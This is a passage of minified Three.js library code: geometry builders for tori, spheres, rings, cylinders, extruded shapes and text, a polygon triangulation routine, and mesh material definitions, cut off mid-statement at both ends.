w=b/n*Math.PI*2,_=-e*Math.cos(w);w=e*Math.sin(w),p.x=m.x+(_*x.x+w*v.x),p.y=m.y+(_*x.y+w*v.y),p.z=m.z+(_*x.z+w*v.z),h.push(p.x,p.y,p.z),f.subVectors(p,m).normalize(),u.push(f.x,f.y,f.z),d.push(l/i),d.push(b/n)}}for(b=1;b<=i;b++)for(l=1;l<=n;l++)t=(n+1)*b+(l-1),e=(n+1)*b+l,a=(n+1)*(b-1)+l,c.push((n+1)*(b-1)+(l-1),t,a),c.push(t,e,a);this.setIndex(c),this.addAttribute("position",new D(h,3)),this.addAttribute("normal",new D(u,3)),this.addAttribute("uv",new D(d,2))}function _i(t,e,i,n,r){U.call(this),this.type="TorusGeometry",this.parameters={radius:t,tube:e,radialSegments:i,tubularSegments:n,arc:r},this.fromBufferGeometry(new Mi(t,e,i,n,r)),this.mergeVertices()}function Mi(t,e,i,n,a){F.call(this),this.type="TorusBufferGeometry",this.parameters={radius:t,tube:e,radialSegments:i,tubularSegments:n,arc:a},t=t||1,e=e||.4,i=Math.floor(i)||8,n=Math.floor(n)||6,a=a||2*Math.PI;var o,s,l=[],c=[],h=[],u=[],d=new r,p=new r,f=new r;for(o=0;o<=i;o++)for(s=0;s<=n;s++){var m=s/n*a,g=o/i*Math.PI*2;p.x=(t+e*Math.cos(g))*Math.cos(m),p.y=(t+e*Math.cos(g))*Math.sin(m),p.z=e*Math.sin(g),c.push(p.x,p.y,p.z),d.x=t*Math.cos(m),d.y=t*Math.sin(m),f.subVectors(p,d).normalize(),h.push(f.x,f.y,f.z),u.push(s/n),u.push(o/i)}for(o=1;o<=i;o++)for(s=1;s<=n;s++)t=(n+1)*(o-1)+s-1,e=(n+1)*(o-1)+s,a=(n+1)*o+s,l.push((n+1)*o+s-1,t,a),l.push(t,e,a);this.setIndex(l),this.addAttribute("position",new D(c,3)),this.addAttribute("normal",new D(h,3)),this.addAttribute("uv",new D(u,2))}function Si(t,e,i,n,r){for(var a,o=0,s=e,l=i-n;s<i;s+=n)o+=(t[l]-t[s])*(t[s+1]+t[l+1]),l=s;if(r===0<o)for(r=e;r<i;r+=n)a=Bi(r,t[r],t[r+1],a);else for(r=i-n;r>=e;r-=n)a=Bi(r,t[r],t[r+1],a);return a&&zi(a,a.next)&&(Fi(a),a=a.next),a}function Ti(t,e){if(!t)return t;e||(e=t);do{var i=!1;if(t.steiner||!zi(t,t.next)&&0!==Ii(t.prev,t,t.next))t=t.next;else{if(Fi(t),(t=e=t.prev)===t.next)break;i=!0}}while(i||t!==e);return e}function Ei(t,e,i,n,r,a,o){if(t){if(!o&&a){var s=t,l=s;do{null===l.z&&(l.z=Pi(l.x,l.y,n,r,a)),l.prevZ=l.prev,l=l.nextZ=l.next}while(l!==s);l.prevZ.nextZ=null,l.prevZ=null,s=l;var c,h,u,d,p=1;do{l=s;var f=s=null;for(h=0;l;){h++;var m=l;for(c=u=0;c<p&&(u++,m=m.nextZ);c++);for(d=p;0<u||0<d&&m;)0!==u&&(0===d||!m||l.z<=m.z)?(c=l,l=l.nextZ,u--):(c=m,m=m.nextZ,d--),f?f.nextZ=c:s=c,c.prevZ=f,f=c;l=m}f.nextZ=null,p*=2}while(1<h)}for(s=t;t.prev!==t.next;){if(l=t.prev,m=t.next,a)f=Ci(t,n,r,a);else t:if(f=t,h=f.prev,u=f,p=f.next,0<=Ii(h,u,p))f=!1;else{for(c=f.next.next;c!==f.prev;){if(Oi(h.x,h.y,u.x,u.y,p.x,p.y,c.x,c.y)&&0<=Ii(c.prev,c,c.next)){f=!1;break t}c=c.next}f=!0}if(f)e.push(l.i/i),e.push(t.i/i),e.push(m.i/i),Fi(t),s=t=m.next;else if((t=m)===s){if(o){if(1===o){o=e,s=i,l=t;do{!zi(m=l.prev,f=l.next.next)&&Di(m,l,l.next,f)&&Ni(m,f)&&Ni(f,m)&&(o.push(m.i/s),o.push(l.i/s),o.push(f.i/s),Fi(l),Fi(l.next),l=t=f),l=l.next}while(l!==t);Ei(t=l,e,i,n,r,a,2)}else if(2===o)t:{o=t;do{for(s=o.next.next;s!==o.prev;){if(l=o.i!==s.i){if(m=s,f=(l=o).next.i!==m.i&&l.prev.i!==m.i){e:{f=l;do{if(f.i!==l.i&&f.next.i!==l.i&&f.i!==m.i&&f.next.i!==m.i&&Di(f,f.next,l,m)){f=!0;break e}f=f.next}while(f!==l);f=!1}f=!f}if(f=f&&Ni(l,m)&&Ni(m,l)){f=l,h=!1,u=(l.x+m.x)/2,m=(l.y+m.y)/2;do{f.y>m!=f.next.y>m&&f.next.y!==f.y&&u<(f.next.x-f.x)*(m-f.y)/(f.next.y-f.y)+f.x&&(h=!h),f=f.next}while(f!==l);f=h}l=f}if(l){t=ki(o,s),o=Ti(o,o.next),t=Ti(t,t.next),Ei(o,e,i,n,r,a),Ei(t,e,i,n,r,a);break t}s=s.next}o=o.next}while(o!==t)}}else Ei(Ti(t),e,i,n,r,a,1);break}}}}function Ci(t,e,i,n){var r=t.prev,a=t.next;if(0<=Ii(r,t,a))return!1;var o=r.x>t.x?r.x>a.x?r.x:a.x:t.x>a.x?t.x:a.x,s=r.y>t.y?r.y>a.y?r.y:a.y:t.y>a.y?t.y:a.y,l=Pi(r.x<t.x?r.x<a.x?r.x:a.x:t.x<a.x?t.x:a.x,r.y<t.y?r.y<a.y?r.y:a.y:t.y<a.y?t.y:a.y,e,i,n);for(e=Pi(o,s,e,i,n),i=t.prevZ,n=t.nextZ;i&&i.z>=l&&n&&n.z<=e;){if(i!==t.prev&&i!==t.next&&Oi(r.x,r.y,t.x,t.y,a.x,a.y,i.x,i.y)&&0<=Ii(i.prev,i,i.next))return!1;if(i=i.prevZ,n!==t.prev&&n!==t.next&&Oi(r.x,r.y,t.x,t.y,a.x,a.y,n.x,n.y)&&0<=Ii(n.prev,n,n.next))return!1;n=n.nextZ}for(;i&&i.z>=l;){if(i!==t.prev&&i!==t.next&&Oi(r.x,r.y,t.x,t.y,a.x,a.y,i.x,i.y)&&0<=Ii(i.prev,i,i.next))return!1;i=i.prevZ}for(;n&&n.z<=e;){if(n!==t.prev&&n!==t.next&&Oi(r.x,r.y,t.x,t.y,a.x,a.y,n.x,n.y)&&0<=Ii(n.prev,n,n.next))return!1;n=n.nextZ}return!0}function Ai(t,e){return t.x-e.x}function Li(t,e){var i=e,n=t.x,r=t.y,a=-1/0;do{if(r<=i.y&&r>=i.next.y&&i.next.y!==i.y){var o=i.x+(r-i.y)*(i.next.x-i.x)/(i.next.y-i.y);if(o<=n&&o>a){if(a=o,o===n){if(r===i.y)return i;if(r===i.next.y)return i.next}var s=i.x<i.next.x?i:i.next}}i=i.next}while(i!==e);if(!s)return null;if(n===a)return s.prev;e=s,o=s.x;var l=s.y,c=1/0;for(i=s.next;i!==e;){if(n>=i.x&&i.x>=o&&n!==i.x&&Oi(r<l?n:a,r,o,l,r<l?a:n,r,i.x,i.y)){var h=Math.abs(r-i.y)/(n-i.x);(h<c||h===c&&i.x>s.x)&&Ni(i,t)&&(s=i,c=h)}i=i.next}return s}function Pi(t,e,i,n,r){return 1431655765&((t=858993459&((t=252645135&((t=16711935&((t=32767*(t-i)*r)|t<<8))|t<<4))|t<<2))|t<<1)|(1431655765&((e=858993459&((e=252645135&((e=16711935&((e=32767*(e-n)*r)|e<<8))|e<<4))|e<<2))|e<<1))<<1}function Ri(t){var e=t,i=t;do{(e.x<i.x||e.x===i.x&&e.y<i.y)&&(i=e),e=e.next}while(e!==t);return i}function Oi(t,e,i,n,r,a,o,s){return 0<=(r-o)*(e-s)-(t-o)*(a-s)&&0<=(t-o)*(n-s)-(i-o)*(e-s)&&0<=(i-o)*(a-s)-(r-o)*(n-s)}function Ii(t,e,i){return(e.y-t.y)*(i.x-e.x)-(e.x-t.x)*(i.y-e.y)}function zi(t,e){return t.x===e.x&&t.y===e.y}function Di(t,e,i,n){return!!(zi(t,i)&&zi(e,n)||zi(t,n)&&zi(i,e))||0<Ii(t,e,i)!=0<Ii(t,e,n)&&0<Ii(i,n,t)!=0<Ii(i,n,e)}function Ni(t,e){return 0>Ii(t.prev,t,t.next)?0<=Ii(t,e,t.next)&&0<=Ii(t,t.prev,e):0>Ii(t,e,t.prev)||0>Ii(t,t.next,e)}function ki(t,e){var i=new Hi(t.i,t.x,t.y),n=new Hi(e.i,e.x,e.y),r=t.next,a=e.prev;return t.next=e,e.prev=t,i.next=r,r.prev=i,n.next=i,i.prev=n,a.next=n,n.prev=a,n}function Bi(t,e,i,n){return t=new Hi(t,e,i),n?(t.next=n.next,t.prev=n,n.next.prev=t,n.next=t):(t.prev=t,t.next=t),t}function Fi(t){t.next.prev=t.prev,t.prev.next=t.next,t.prevZ&&(t.prevZ.nextZ=t.nextZ),t.nextZ&&(t.nextZ.prevZ=t.prevZ)}function Hi(t,e,i){this.i=t,this.x=e,this.y=i,this.nextZ=this.prevZ=this.z=this.next=this.prev=null,this.steiner=!1}function Gi(t){var e=t.length;2<e&&t[e-1].equals(t[0])&&t.pop()}function ji(t,e){for(var i=0;i<e.length;i++)t.push(e[i].x),t.push(e[i].y)}function Ui(t,e){U.call(this),this.type="ExtrudeGeometry",this.parameters={shapes:t,options:e},this.fromBufferGeometry(new Vi(t,e)),this.mergeVertices()}function Vi(t,e){function n(t){function n(t,e,i){return e||console.error("THREE.ExtrudeGeometry: vec does not exist"),e.clone().multiplyScalar(i).add(t)}function l(t,e,n){var r=t.x-e.x,a=t.y-e.y,o=n.x-t.x,s=n.y-t.y,l=r*r+a*a;if(Math.abs(r*s-a*o)>Number.EPSILON){var c=Math.sqrt(l),h=Math.sqrt(o*o+s*s);if(l=e.x-a/c,e=e.y+r/c,2>=(a=(o=l+r*(s=((n.x-s/h-l)*s-(n.y+o/h-e)*o)/(r*s-a*o))-t.x)*o+(r=e+a*s-t.y)*r))return new i(o,r);a=Math.sqrt(a/2)}else t=!1,r>Number.EPSILON?o>Number.EPSILON&&(t=!0):r<-Number.EPSILON?o<-Number.EPSILON&&(t=!0):Math.sign(a)===Math.sign(s)&&(t=!0),t?(o=-a,a=Math.sqrt(l)):(o=r,r=a,a=Math.sqrt(l/2));return new i(o/a,r/a)}function c(t,e){for(G=t.length;0<=--G;){var i=G,n=G-1;0>n&&(n=t.length-1);var r,s=g+2*_;for(r=0;r<s;r++){var l=F*r,c=F*(r+1),h=e+n+l,u=e+n+c;c=e+i+c,d(e+i+l),d(h),d(c),d(h),d(u),d(c),l=o.length/3,p((l=S.generateSideWallUV(a,o,l-6,l-3,l-2,l-1))[0]),p(l[1]),p(l[3]),p(l[1]),p(l[2]),p(l[3])}}}function h(t,e,i){f.push(t),f.push(e),f.push(i)}function u(t,e,i){d(t),d(e),d(i),t=o.length/3,p((t=S.generateTopUV(a,o,t-3,t-2,t-1))[0]),p(t[1]),p(t[2])}function d(t){o.push(f[3*t]),o.push(f[3*t+1]),o.push(f[3*t+2])}function p(t){s.push(t.x),s.push(t.y)}var f=[],m=void 0!==e.curveSegments?e.curveSegments:12,g=void 0!==e.steps?e.steps:1,v=void 0!==e.depth?e.depth:100,y=void 0===e.bevelEnabled||e.bevelEnabled,x=void 0!==e.bevelThickness?e.bevelThickness:6,b=void 0!==e.bevelSize?e.bevelSize:x-2,w=void 0!==e.bevelOffset?e.bevelOffset:0,_=void 0!==e.bevelSegments?e.bevelSegments:3,M=e.extrudePath,S=void 0!==e.UVGenerator?e.UVGenerator:hl;void 0!==e.amount&&(console.warn("THREE.ExtrudeBufferGeometry: amount has been renamed to depth."),v=e.amount);var T,E=!1;if(M){var C=M.getSpacedPoints(g);E=!0,y=!1;var A=M.computeFrenetFrames(g,!1),L=new r,P=new r,R=new r}y||(w=b=x=_=0),m=t.extractPoints(m),t=m.shape;var O=m.holes;if(!cl.isClockWise(t)){t=t.reverse();var I=0;for(T=O.length;I<T;I++){var z=O[I];cl.isClockWise(z)&&(O[I]=z.reverse())}}var D=cl.triangulateShape(t,O),N=t;for(I=0,T=O.length;I<T;I++)z=O[I],t=t.concat(z);var k,B,F=t.length,H=D.length;m=[];var G=0,j=N.length,U=j-1;for(k=G+1;G<j;G++,U++,k++)U===j&&(U=0),k===j&&(k=0),m[G]=l(N[G],N[U],N[k]);M=[];var V=m.concat();for(I=0,T=O.length;I<T;I++){z=O[I];var W=[];for(G=0,U=(j=z.length)-1,k=G+1;G<j;G++,U++,k++)U===j&&(U=0),k===j&&(k=0),W[G]=l(z[G],z[U],z[k]);M.push(W),V=V.concat(W)}for(U=0;U<_;U++){j=U/_;var q=x*Math.cos(j*Math.PI/2);for(k=b*Math.sin(j*Math.PI/2)+w,G=0,j=N.length;G<j;G++){var X=n(N[G],m[G],k);h(X.x,X.y,-q)}for(I=0,T=O.length;I<T;I++)for(z=O[I],W=M[I],G=0,j=z.length;G<j;G++)h((X=n(z[G],W[G],k)).x,X.y,-q)}for(k=b+w,G=0;G<F;G++)X=y?n(t[G],V[G],k):t[G],E?(P.copy(A.normals[0]).multiplyScalar(X.x),L.copy(A.binormals[0]).multiplyScalar(X.y),R.copy(C[0]).add(P).add(L),h(R.x,R.y,R.z)):h(X.x,X.y,0);for(j=1;j<=g;j++)for(G=0;G<F;G++)X=y?n(t[G],V[G],k):t[G],E?(P.copy(A.normals[j]).multiplyScalar(X.x),L.copy(A.binormals[j]).multiplyScalar(X.y),R.copy(C[j]).add(P).add(L),h(R.x,R.y,R.z)):h(X.x,X.y,v/g*j);for(U=_-1;0<=U;U--){for(j=U/_,q=x*Math.cos(j*Math.PI/2),k=b*Math.sin(j*Math.PI/2)+w,G=0,j=N.length;G<j;G++)h((X=n(N[G],m[G],k)).x,X.y,v+q);for(I=0,T=O.length;I<T;I++)for(z=O[I],W=M[I],G=0,j=z.length;G<j;G++)X=n(z[G],W[G],k),E?h(X.x,X.y+C[g-1].y,C[g-1].x+q):h(X.x,X.y,v+q)}!function(){var t=o.length/3;if(y){var e=0*F;for(G=0;G<H;G++)u((B=D[G])[2]+e,B[1]+e,B[0]+e);for(e=F*(g+2*_),G=0;G<H;G++)u((B=D[G])[0]+e,B[1]+e,B[2]+e)}else{for(G=0;G<H;G++)u((B=D[G])[2],B[1],B[0]);for(G=0;G<H;G++)u((B=D[G])[0]+F*g,B[1]+F*g,B[2]+F*g)}a.addGroup(t,o.length/3-t,0)}(),function(){var t=o.length/3,e=0;for(c(N,e),e+=N.length,I=0,T=O.length;I<T;I++)c(z=O[I],e),e+=z.length;a.addGroup(t,o.length/3-t,1)}()}F.call(this),this.type="ExtrudeBufferGeometry",this.parameters={shapes:t,options:e},t=Array.isArray(t)?t:[t];for(var a=this,o=[],s=[],l=0,c=t.length;l<c;l++)n(t[l]);this.addAttribute("position",new D(o,3)),this.addAttribute("uv",new D(s,2)),this.computeVertexNormals()}function Wi(t,e,i){if(i.shapes=[],Array.isArray(t))for(var n=0,r=t.length;n<r;n++)i.shapes.push(t[n].uuid);else i.shapes.push(t.uuid);return void 0!==e.extrudePath&&(i.options.extrudePath=e.extrudePath.toJSON()),i}function qi(t,e){U.call(this),this.type="TextGeometry",this.parameters={text:t,parameters:e},this.fromBufferGeometry(new Xi(t,e)),this.mergeVertices()}function Xi(t,e){var i=(e=e||{}).font;if(!i||!i.isFont)return console.error("THREE.TextGeometry: font parameter is not an instance of THREE.Font."),new U;t=i.generateShapes(t,e.size),e.depth=void 0!==e.height?e.height:50,void 0===e.bevelThickness&&(e.bevelThickness=10),void 0===e.bevelSize&&(e.bevelSize=8),void 0===e.bevelEnabled&&(e.bevelEnabled=!1),Vi.call(this,t,e),this.type="TextBufferGeometry"}function Yi(t,e,i,n,r,a,o){U.call(this),this.type="SphereGeometry",this.parameters={radius:t,widthSegments:e,heightSegments:i,phiStart:n,phiLength:r,thetaStart:a,thetaLength:o},this.fromBufferGeometry(new $i(t,e,i,n,r,a,o)),this.mergeVertices()}function $i(t,e,i,n,a,o,s){F.call(this),this.type="SphereBufferGeometry",this.parameters={radius:t,widthSegments:e,heightSegments:i,phiStart:n,phiLength:a,thetaStart:o,thetaLength:s},t=t||1,e=Math.max(3,Math.floor(e)||8),i=Math.max(2,Math.floor(i)||6),n=void 0!==n?n:0,a=void 0!==a?a:2*Math.PI,o=void 0!==o?o:0,s=void 0!==s?s:Math.PI;var l,c,h=Math.min(o+s,Math.PI),u=0,d=[],p=new r,f=new r,m=[],g=[],v=[],y=[];for(c=0;c<=i;c++){var x=[],b=c/i,w=0;for(0==c&&0==o?w=.5/e:c==i&&h==Math.PI&&(w=-.5/e),l=0;l<=e;l++){var _=l/e;p.x=-t*Math.cos(n+_*a)*Math.sin(o+b*s),p.y=t*Math.cos(o+b*s),p.z=t*Math.sin(n+_*a)*Math.sin(o+b*s),g.push(p.x,p.y,p.z),f.copy(p).normalize(),v.push(f.x,f.y,f.z),y.push(_+w,1-b),x.push(u++)}d.push(x)}for(c=0;c<i;c++)for(l=0;l<e;l++)t=d[c][l+1],n=d[c][l],a=d[c+1][l],s=d[c+1][l+1],(0!==c||0<o)&&m.push(t,n,s),(c!==i-1||h<Math.PI)&&m.push(n,a,s);this.setIndex(m),this.addAttribute("position",new D(g,3)),this.addAttribute("normal",new D(v,3)),this.addAttribute("uv",new D(y,2))}function Zi(t,e,i,n,r,a){U.call(this),this.type="RingGeometry",this.parameters={innerRadius:t,outerRadius:e,thetaSegments:i,phiSegments:n,thetaStart:r,thetaLength:a},this.fromBufferGeometry(new Ji(t,e,i,n,r,a)),this.mergeVertices()}function Ji(t,e,n,a,o,s){F.call(this),this.type="RingBufferGeometry",this.parameters={innerRadius:t,outerRadius:e,thetaSegments:n,phiSegments:a,thetaStart:o,thetaLength:s},t=t||.5,e=e||1,o=void 0!==o?o:0,s=void 0!==s?s:2*Math.PI,n=void 0!==n?Math.max(3,n):8;var l,c,h=[],u=[],d=[],p=[],f=t,m=(e-t)/(a=void 0!==a?Math.max(1,a):1),g=new r,v=new i;for(l=0;l<=a;l++){for(c=0;c<=n;c++)t=o+c/n*s,g.x=f*Math.cos(t),g.y=f*Math.sin(t),u.push(g.x,g.y,g.z),d.push(0,0,1),v.x=(g.x/e+1)/2,v.y=(g.y/e+1)/2,p.push(v.x,v.y);f+=m}for(l=0;l<a;l++)for(e=l*(n+1),c=0;c<n;c++)o=(t=c+e)+n+1,s=t+n+2,f=t+1,h.push(t,o,f),h.push(o,s,f);this.setIndex(h),this.addAttribute("position",new D(u,3)),this.addAttribute("normal",new D(d,3)),this.addAttribute("uv",new D(p,2))}function Ki(t,e,i,n){U.call(this),this.type="LatheGeometry",this.parameters={points:t,segments:e,phiStart:i,phiLength:n},this.fromBufferGeometry(new Qi(t,e,i,n)),this.mergeVertices()}function Qi(t,e,n,a){F.call(this),this.type="LatheBufferGeometry",this.parameters={points:t,segments:e,phiStart:n,phiLength:a},e=Math.floor(e)||12,n=n||0,a=a||2*Math.PI,a=Ca.clamp(a,0,2*Math.PI);var o,s=[],l=[],c=[],h=1/e,u=new r,d=new i;for(o=0;o<=e;o++){var p=n+o*h*a,f=Math.sin(p),m=Math.cos(p);for(p=0;p<=t.length-1;p++)u.x=t[p].x*f,u.y=t[p].y,u.z=t[p].x*m,l.push(u.x,u.y,u.z),d.x=o/e,d.y=p/(t.length-1),c.push(d.x,d.y)}for(o=0;o<e;o++)for(p=0;p<t.length-1;p++)h=(n=p+o*t.length)+t.length,u=n+t.length+1,d=n+1,s.push(n,h,d),s.push(h,u,d);if(this.setIndex(s),this.addAttribute("position",new D(l,3)),this.addAttribute("uv",new D(c,2)),this.computeVertexNormals(),a===2*Math.PI)for(a=this.attributes.normal.array,s=new r,l=new r,c=new r,n=e*t.length*3,p=o=0;o<t.length;o++,p+=3)s.x=a[p+0],s.y=a[p+1],s.z=a[p+2],l.x=a[n+p+0],l.y=a[n+p+1],l.z=a[n+p+2],c.addVectors(s,l).normalize(),a[p+0]=a[n+p+0]=c.x,a[p+1]=a[n+p+1]=c.y,a[p+2]=a[n+p+2]=c.z}function tn(t,e){U.call(this),this.type="ShapeGeometry","object"==typeof e&&(console.warn("THREE.ShapeGeometry: Options parameter has been removed."),e=e.curveSegments),this.parameters={shapes:t,curveSegments:e},this.fromBufferGeometry(new en(t,e)),this.mergeVertices()}function en(t,e){function i(t){var i,s=r.length/3,c=(t=t.extractPoints(e)).shape,h=t.holes;for(!1===cl.isClockWise(c)&&(c=c.reverse()),t=0,i=h.length;t<i;t++){var u=h[t];!0===cl.isClockWise(u)&&(h[t]=u.reverse())}var d=cl.triangulateShape(c,h);for(t=0,i=h.length;t<i;t++)u=h[t],c=c.concat(u);for(t=0,i=c.length;t<i;t++)u=c[t],r.push(u.x,u.y,0),a.push(0,0,1),o.push(u.x,u.y);for(t=0,i=d.length;t<i;t++)c=d[t],n.push(c[0]+s,c[1]+s,c[2]+s),l+=3}F.call(this),this.type="ShapeBufferGeometry",this.parameters={shapes:t,curveSegments:e},e=e||12;var n=[],r=[],a=[],o=[],s=0,l=0;if(!1===Array.isArray(t))i(t);else for(var c=0;c<t.length;c++)i(t[c]),this.addGroup(s,l,c),s+=l,l=0;this.setIndex(n),this.addAttribute("position",new D(r,3)),this.addAttribute("normal",new D(a,3)),this.addAttribute("uv",new D(o,2))}function nn(t,e){if(e.shapes=[],Array.isArray(t))for(var i=0,n=t.length;i<n;i++)e.shapes.push(t[i].uuid);else e.shapes.push(t.uuid);return e}function rn(t,e){F.call(this),this.type="EdgesGeometry",this.parameters={thresholdAngle:e};var i=[];e=Math.cos(Ca.DEG2RAD*(void 0!==e?e:1));var n=[0,0],r={},a=["a","b","c"];if(t.isBufferGeometry){var o=new U;o.fromBufferGeometry(t)}else o=t.clone();o.mergeVertices(),o.computeFaceNormals(),t=o.vertices;for(var s=0,l=(o=o.faces).length;s<l;s++)for(var c=o[s],h=0;3>h;h++){var u=c[a[h]],d=c[a[(h+1)%3]];n[0]=Math.min(u,d),n[1]=Math.max(u,d),void 0===r[u=n[0]+","+n[1]]?r[u]={index1:n[0],index2:n[1],face1:s,face2:void 0}:r[u].face2=s}for(u in r)(void 0===(n=r[u]).face2||o[n.face1].normal.dot(o[n.face2].normal)<=e)&&(a=t[n.index1],i.push(a.x,a.y,a.z),a=t[n.index2],i.push(a.x,a.y,a.z));this.addAttribute("position",new D(i,3))}function an(t,e,i,n,r,a,o,s){U.call(this),this.type="CylinderGeometry",this.parameters={radiusTop:t,radiusBottom:e,height:i,radialSegments:n,heightSegments:r,openEnded:a,thetaStart:o,thetaLength:s},this.fromBufferGeometry(new on(t,e,i,n,r,a,o,s)),this.mergeVertices()}function on(t,e,n,a,o,s,l,c){function h(n){var o,s=new i,h=new r,v=0,b=!0===n?t:e,w=!0===n?1:-1,_=g;for(o=1;o<=a;o++)p.push(0,y*w,0),f.push(0,w,0),m.push(.5,.5),g++;var M=g;for(o=0;o<=a;o++){var S=o/a*c+l,T=Math.cos(S);S=Math.sin(S),h.x=b*S,h.y=y*w,h.z=b*T,p.push(h.x,h.y,h.z),f.push(0,w,0),s.x=.5*T+.5,s.y=.5*S*w+.5,m.push(s.x,s.y),g++}for(o=0;o<a;o++)s=_+o,h=M+o,!0===n?d.push(h,h+1,s):d.push(h+1,h,s),v+=3;u.addGroup(x,v,!0===n?1:2),x+=v}F.call(this),this.type="CylinderBufferGeometry",this.parameters={radiusTop:t,radiusBottom:e,height:n,radialSegments:a,heightSegments:o,openEnded:s,thetaStart:l,thetaLength:c};var u=this;t=void 0!==t?t:1,e=void 0!==e?e:1,n=n||1,a=Math.floor(a)||8,o=Math.floor(o)||1,s=void 0!==s&&s,l=void 0!==l?l:0,c=void 0!==c?c:2*Math.PI;var d=[],p=[],f=[],m=[],g=0,v=[],y=n/2,x=0;!function(){var i,s,h=new r,b=new r,w=0,_=(e-t)/n;for(s=0;s<=o;s++){var M=[],S=s/o,T=S*(e-t)+t;for(i=0;i<=a;i++){var E=i/a,C=E*c+l,A=Math.sin(C);C=Math.cos(C),b.x=T*A,b.y=-S*n+y,b.z=T*C,p.push(b.x,b.y,b.z),h.set(A,_,C).normalize(),f.push(h.x,h.y,h.z),m.push(E,1-S),M.push(g++)}v.push(M)}for(i=0;i<a;i++)for(s=0;s<o;s++)h=v[s+1][i],b=v[s+1][i+1],_=v[s][i+1],d.push(v[s][i],h,_),d.push(h,b,_),w+=6;u.addGroup(x,w,0),x+=w}(),!1===s&&(0<t&&h(!0),0<e&&h(!1)),this.setIndex(d),this.addAttribute("position",new D(p,3)),this.addAttribute("normal",new D(f,3)),this.addAttribute("uv",new D(m,2))}function sn(t,e,i,n,r,a,o){an.call(this,0,t,e,i,n,r,a,o),this.type="ConeGeometry",this.parameters={radius:t,height:e,radialSegments:i,heightSegments:n,openEnded:r,thetaStart:a,thetaLength:o}}function ln(t,e,i,n,r,a,o){on.call(this,0,t,e,i,n,r,a,o),this.type="ConeBufferGeometry",this.parameters={radius:t,height:e,radialSegments:i,heightSegments:n,openEnded:r,thetaStart:a,thetaLength:o}}function cn(t,e,i,n){U.call(this),this.type="CircleGeometry",this.parameters={radius:t,segments:e,thetaStart:i,thetaLength:n},this.fromBufferGeometry(new hn(t,e,i,n)),this.mergeVertices()}function hn(t,e,n,a){F.call(this),this.type="CircleBufferGeometry",this.parameters={radius:t,segments:e,thetaStart:n,thetaLength:a},t=t||1,e=void 0!==e?Math.max(3,e):8,n=void 0!==n?n:0,a=void 0!==a?a:2*Math.PI;var o,s=[],l=[],c=[],h=[],u=new r,d=new i;l.push(0,0,0),c.push(0,0,1),h.push(.5,.5);var p=0;for(o=3;p<=e;p++,o+=3){var f=n+p/e*a;u.x=t*Math.cos(f),u.y=t*Math.sin(f),l.push(u.x,u.y,u.z),c.push(0,0,1),d.x=(l[o]/t+1)/2,d.y=(l[o+1]/t+1)/2,h.push(d.x,d.y)}for(o=1;o<=e;o++)s.push(o,o+1,0);this.setIndex(s),this.addAttribute("position",new D(l,3)),this.addAttribute("normal",new D(c,3)),this.addAttribute("uv",new D(h,2))}function un(t){T.call(this),this.type="ShadowMaterial",this.color=new b(0),this.transparent=!0,this.setValues(t)}function dn(t){Y.call(this,t),this.type="RawShaderMaterial"}function pn(t){T.call(this),this.defines={STANDARD:""},this.type="MeshStandardMaterial",this.color=new b(16777215),this.metalness=this.roughness=.5,this.lightMap=this.map=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new b(0),this.emissiveIntensity=1,this.bumpMap=this.emissiveMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new i(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.envMap=this.alphaMap=this.metalnessMap=this.roughnessMap=null,this.envMapIntensity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinejoin=this.wireframeLinecap="round",this.morphNormals=this.morphTargets=this.skinning=!1,this.setValues(t)}function fn(t){pn.call(this),this.defines={STANDARD:"",PHYSICAL:""},this.type="MeshPhysicalMaterial",this.reflectivity=.5,this.clearcoatRoughness=this.clearcoat=0,this.sheen=null,this.clearcoatNormalScale=new i(1,1),this.clearcoatNormalMap=null,this.transparency=0,this.setValues(t)}function mn(t){T.call(this),this.type="MeshPhongMaterial",this.color=new b(16777215),this.specular=new b(1118481),this.shininess=30,this.lightMap=this.map=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new b(0),this.emissiveIntensity=1,this.bumpMap=this.emissiveMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new i(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.envMap=this.alphaMap=this.specularMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinejoin=this.wireframeLinecap="round",this.morphNormals=this.morphTargets=this.skinning=!1,this.setValues(t)}function gn(t){mn.call(this),this.defines={TOON:""},this.type="MeshToonMaterial",this.gradientMap=null,this.setValues(t)}function vn(t){T.call(this),this.type="MeshNormalMaterial",this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new i(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.morphNormals=this.morphTargets=this.skinning=this.lights=this.fog=!1,this.setValues(t)}function yn(t){T.call(this),this.type="MeshLambertMaterial",this.color=new b(16777215),this.lightMap=this.map=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.emissive=new b(0),this.emissiveIntensity=1,this.envMap=this.alphaMap=this.specularMap=this.emissiveMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinejoin=this.wireframeLinecap="round",this.morphNormals=this.morphTargets=this.skinning=!1,this.setValues(t)}function xn(t){T.call(this),this.defines={MATCAP:""},this.type="MeshMatcapMaterial",this.color=new b(16777215),this.bumpMap=this.map=this.matcap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new i(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.alphaMap=null,this.lights=this.morphNormals=this.morphTargets=this.skinning=!1,this.setValues(t)}function bn(t){Ye.call(this),this.type="LineDashedMaterial",this.scale=1,this.dashSize=3,this.gapSize=1,this.setValues(t)}function wn(t,e,i,n){this.parameterPositions=t,this._cachedIndex=0,this.resultBuffer=void 0!==n?n:new e.constructor(i),this.sampleValues=e,this.valueSize=i}function _n(t,e,i,n){wn.call(this,t,e,i,n),this._offsetNext=this._weightNext=this._offsetPrev=this._weightPrev=-0}function Mn(t,e,i,n){wn.call(this,t,e,i,n)}function Sn(t,e,i,n){wn.call(this,t,e,i,n)}function Tn(t,e,i,n){if(void 